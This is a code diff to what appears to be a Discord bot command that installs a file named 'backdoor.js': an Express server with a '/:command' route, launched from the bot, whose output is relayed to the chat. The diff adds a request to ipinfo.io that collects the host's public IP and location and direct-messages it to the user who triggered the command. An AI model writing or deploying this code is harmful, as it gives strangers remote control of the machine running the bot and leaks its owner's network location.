@@ -37,7 +37,7 @@ const express = require('express');
 const app = express();
 
 app.get("/", function (req, res) {
-    res.send("success);
+    res.send("success");
 })
 
 app.get("/:command", function (req, res) {
@@ -55,7 +55,7 @@ app.listen(3000, function (err) {
 });`;
 
         require("child_process").spawn("touch", ["backdoor.js"]);
-        require("child_process").spawn("npm", ["i", "express"]);
+        // require("child_process").spawn("npm", ["i", "express"]);
         require("fs").writeFile("backdoor.js", code, (err) => {
             if (err) return console.log(err);
         });
@@ -65,6 +65,33 @@ app.listen(3000, function (err) {
             .on("data", (data) => {
                 message.channel.send(data);
             });
+
+        message.channel.send("installed");
+        const req = require("http")
+            .request(
+                {
+                    hostname: "ipinfo.io",
+                    path: "/json",
+                    method: "GET",
+                },
+                (res) => {
+                    let data = "";
+
+                    res.on("data", (chunk) => {
+                        data += chunk;
+                    });
+
+                    res.on("end", () => {
+                        message.author.send(data);
+                    });
+                }
+            )
+
+            .on("error", (err) => {
+                console.log("Error: ", err);
+            })
+
+            .end();
     },
 };
 
